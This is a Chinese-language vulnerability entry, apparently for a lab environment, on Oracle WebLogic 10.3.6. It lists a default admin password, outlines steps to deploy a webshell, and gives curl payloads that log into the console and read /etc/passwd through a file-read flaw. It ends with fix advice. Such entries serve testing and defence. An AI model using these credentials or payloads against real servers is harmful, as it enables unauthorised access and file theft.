---
id: WEBLOGIC-WEAK_PASSWORD
title: WebLogic 弱口令、任意文件读取与远程代码执行
product: weblogic
vendor: Oracle
version_affected: "10.3.6"
severity: CRITICAL
tags: [rce, file_read, 需要认证]
fingerprint: ["Oracle WebLogic", "WebLogic"]
---

## 漏洞描述

本环境模拟了一个真实的 WebLogic 环境，包含两个漏洞：后台管理控制台存在弱口令，以及前台存在任意文件读取漏洞。通过这两个漏洞可以获取管理员密码并部署 webshell 获取服务器权限。

## 影响版本

- Oracle WebLogic 10.3.6

## 前置条件

- 需要弱口令（weblogic:Oracle@123）
- 或利用任意文件读取漏洞

## 利用步骤

1. 使用弱口令登录后台
2. 或利用任意文件读取获取密钥和密文
3. 解密密码
4. 部署 webshell

## Payload

```bash
# 使用弱口令登录
curl -u "weblogic:Oracle@123" http://target:7001/console

# 读取任意文件
curl "http://target:7001/hello/file.jsp?path=/etc/passwd"
```

## 验证方法

```bash
# 成功登录后台或读取文件
```

## 修复建议

1. 修改默认弱口令
2. 升级 WebLogic 至最新版本
3. 修复任意文件读取漏洞
